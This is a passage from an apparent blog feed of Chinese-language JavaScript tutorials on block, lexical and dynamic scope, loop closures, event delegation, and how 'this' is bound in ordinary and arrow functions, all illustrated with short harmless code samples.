<code>(function() { //... })()</code> 里面包裹的内容，能够很好地消除全局变量的影响；</p><h3 id="块级作用域："><a href="#块级作用域：" class="headerlink" title="块级作用域："></a>块级作用域：</h3><p>在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i)<span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>很明显，用 var 关键字声明的变量，在 <code>for</code> 循环之后仍然被保存这个作用域里；</p><p>这可以说明： <code>for() { }</code>仍然在，全局作用域里，并没有产生像函数作用域一样的封闭效果；</p><p>如果想要实现 <strong>块级作用域</strong> 那么我们需要用 <code>let</code> 关键字声明！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i)<span class="comment">// 报错：ReferenceError: i is not defined</span></span><br></pre></td></tr></table></figure><p><strong>在 for 循环执行完毕之后 i 变量就被释放了，它已经消失了！！！</strong></p><p>同样能形成块级作用域的还有 <code>const</code> 关键字：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 报错：ReferenceError: a is not defined</span></span><br></pre></td></tr></table></figure><p><code>let</code> 和 <code>const</code> 关键字，创建块级作用域的条件是必须有一个 <code>{ }</code> 包裹：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> b = <span class="string">'inner'</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure><p>不要小看块级作用域，它能帮你做很多事情，举个栗子：</p><p>举一个面试中常见的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(i);<span class="comment">// 5 5 5 5 5</span></span><br><span class="line">  &#125;, <span class="number">200</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这几乎是作用域的必考题目，你会觉得这种结果很奇怪，但是事实就是这么发生了；</p><p>这里的 i 是在全局作用域里面的，只存在 1 个值，等到回调函数执行时，用词法作用域捕获的 i 就只能是 5；</p><p>因为这个循环计算的 i 值在回调函数结束之前就已经执行到 5 了；我们应该如何让它恢复正常呢？？？</p><p><strong>解法1：调用函数，创建函数作用域：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  abc(i);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(i);<span class="comment">// 0 1 2 3 4 </span></span><br><span class="line">  &#125;, <span class="number">200</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里相当于创建了5个函数作用域来保存，我们的 i 值；</p><p><strong>解法2：采用立即执行函数，创建函数作用域；</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(j);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>原理同上，只不过换成了自动执行这个函数罢了，这里保存了 5 次 i 的值；</p><p><strong>解法3：let  创建块级作用域，可以将块级作用域理解为: 使用let和const声明的变量, 只在当前大括号内生效 </strong> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的大括号内主要指的是一下几种情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 条件语句</span></span><br><span class="line"><span class="keyword">if</span> () &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch语句</span></span><br><span class="line"><span class="keyword">switch</span> () &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for / while循环语句</span></span><br><span class="line"><span class="keyword">for</span> () &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> () &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// try...catch语句</span></span><br><span class="line"><span class="keyword">try</span> () <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单大括号</span></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p>for循环问题的解决</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第四个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> oli = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"li"</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// //相当于</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> i</span></span><br><span class="line"><span class="undefined">    i=0</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=1</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">1</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=2</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">2</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=3</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">3</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript"> <span class="comment">//按照词法作用域查找，会每次都找到全局的i</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法一：改为let</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 《深入理解ES6》上面说循环中的let声明在循环内部是标准中专门定义的</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 而是每次let声明都会创建一个新的变量i，并将其初始化为i的当前值</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> i = <span class="comment">//i，暂存的思想</span></span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//这个时候在执行点击事件时，i会在for循环的第一行找到i的值</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法二：闭包</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法三：暂存数据,和let原理类似</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="undefined">        oli[i].index = i</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.index)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法四：事件委托</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oul = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"ul"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">    oul.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> e = e || <span class="built_in">window</span>.event</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> target = e.target || e.srcElement</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(target.nodeName.toLowerCase() == <span class="string">'li'</span>)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> li=<span class="keyword">this</span>.querySelectorAll(<span class="string">"li"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> index = <span class="built_in">Array</span>.prototype.indexOf.call(li,target);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(index);</span></span><br><span class="line"><span class="undefined">　　　　    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br></pre></td></tr></table></figure><h3 id="词法作用域："><a href="#词法作用域：" class="headerlink" title="词法作用域："></a>词法作用域：</h3><p>词法作用域是指一个变量的可见性，及其文本表述的模拟值（《JavaScript函数式编程》）;</p><p>听起来，十分地晦涩，不过将代码拿来分析就非常浅显易懂了；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'middle'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "middle"</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(testValue);<span class="comment">// "inner"</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> innerFun();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">afun();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(testValue);<span class="comment">// "outer"</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>当我们要使用声明的变量时：JS引擎总会从最近的一个域，向外层域查找；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce92a304bc47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>再举一个一个实际的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "outer"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>显然，当 JS 引擎查找这个变量时，发现全局的 testValue 离得更近一些，这恰好和 动态作用域 相反；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce99fad0f0ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>如上图所示，下面将讲述与 词法作用域相反的动态作用域；</p><h3 id="动态作用域："><a href="#动态作用域：" class="headerlink" title="动态作用域："></a>动态作用域：</h3><p>在编程中，最容易被低估和滥用的概念就是动态作用域（《JavaScript函数式编程》）。</p><p>在 JavaScript 中的仅存的应用动态作用域的地方：<code>this</code> 引用，所以这是一个大坑！！！！！</p><blockquote><p>动态作用域，作用域是基于调用栈的，而不是代码中的作用域嵌套；</p><p>作用域嵌套，有词法作用域一样的特性，查找变量时，总是寻找最近的作用域；</p></blockquote><p>同样是，词法作用域，例子2，同一份代码，<strong>如果</strong> 是动态作用域：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "inner"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>当然，JavaScript 除了this之外，其他，都是根据词法作用域查找！！！</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce78d69108cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>为什么要理解动态作用域呢？因为，这能让你更好地学习 <code>this</code> 引用！！！</p><p> 要清楚，JavaScript 实际上没有动态作用域。它拥有词法作用域。就这么简单。但是 <code>this</code> 机制有些像动态作用域。</p><p>关键的差异：词法作用域是编写时的，而动态作用域（和 <code>this</code>）是运行时的。词法作用域关心的是 <em>函数在何处被声明</em>，但是动态作用域关心的是函数 <em>从何处</em> 被调用。</p><p>作者：leiting1998<br>链接：<a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">https://juejin.im/post/5abb99e9f265da2392366824</a><br>来源：掘金</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javascript中this的指向</title>
      <link href="2018/10/31/%E6%95%B4%E7%90%86-Javascript%E4%B8%ADthis%E7%9A%84%E6%8C%87%E5%90%91/"/>
      <url>2018/10/31/%E6%95%B4%E7%90%86-Javascript%E4%B8%ADthis%E7%9A%84%E6%8C%87%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="this的指向"><a href="#this的指向" class="headerlink" title="this的指向"></a>this的指向</h1><ol><li><p>普通函数指向函数的调用者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有个简便的方法就是看函数前面有没有点,如果有点,那么就指向点前面的那个值;</span><br><span class="line">也就是说this的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定this到底指向谁，实际上this的最终指向的是那个调用它的对象</span><br></pre></td></tr></table></figure></li><li><p>箭头函数指向函数所在的所用域:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意理解作用域,只有函数的&#123;&#125;构成作用域,对象的&#123;&#125;以及 if()&#123;&#125;都不构成作用域;</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="1-普通函数与箭头函数this指向的区别"><a href="#1-普通函数与箭头函数this指向的区别" class="headerlink" title="1.普通函数与箭头函数this指向的区别"></a>1.普通函数与箭头函数this指向的区别</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    name: <span class="string">'objName'</span>,</span><br><span class="line">    say() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;,</span><br><span class="line">    read: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say(); <span class="comment">// objName,函数被obj对象调用，所以this指向obj</span></span><br><span class="line">obj.read(); <span class="comment">// undefined，此时函数的作用域为全局环境，window.name未定义</span></span><br></pre></td></tr></table></figure><h2 id="2-普通函数与作为对象方法函数this指向的区别"><a href="#2-普通函数与作为对象方法函数this指向的区别" class="headerlink" title="2.普通函数与作为对象方法函数this指向的区别"></a>2.普通函数与作为对象方法函数this指向的区别</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.val = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    val: <span class="number">2</span>,</span><br><span class="line">    dbl: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val *= <span class="number">2</span>;</span><br><span class="line">        val *= <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(val);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//作为对象方法</span></span><br><span class="line">obj.dbl(); <span class="comment">// 2 4,this指的是obj，所以this.val值为4，val相当于window.val值为2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//普通函数</span></span><br><span class="line"><span class="keyword">var</span> func = obj.dbl;</span><br><span class="line">func(); <span class="comment">// 8 8，func()没有任何前缀，this指的是window.func();所以此时this值得是window，值均为8</span></span><br></pre></td></tr></table></figure><h2 id="3-如何解决函数体内的函数绑定到全局对象的问题"><a href="#3-如何解决函数体内的函数绑定到全局对象的问题" class="headerlink" title="3.如何解决函数体内的函数绑定到全局对象的问题"></a>3.如何解决函数体内的函数绑定到全局对象的问题</h2><p>我们希望在 moveTo 方法内定义两个函数，分别将 x，y 坐标进行平移。结果可能出乎大家意料，不仅 point 对象没有移动，反而多出两个全局变量 x，y。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">x : <span class="number">0</span>, </span><br><span class="line">y : <span class="number">0</span>, </span><br><span class="line">moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    &#125;; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">   <span class="keyword">this</span>.y = y;</span><br><span class="line">    &#125;; </span><br><span class="line"> </span><br><span class="line">              <span class="comment">//moveX(x)函数前面没有对象，默认为window.moveX(x),所以this指向window</span></span><br><span class="line">   moveX(x); </span><br><span class="line">   moveY(y); </span><br><span class="line">&#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line"><span 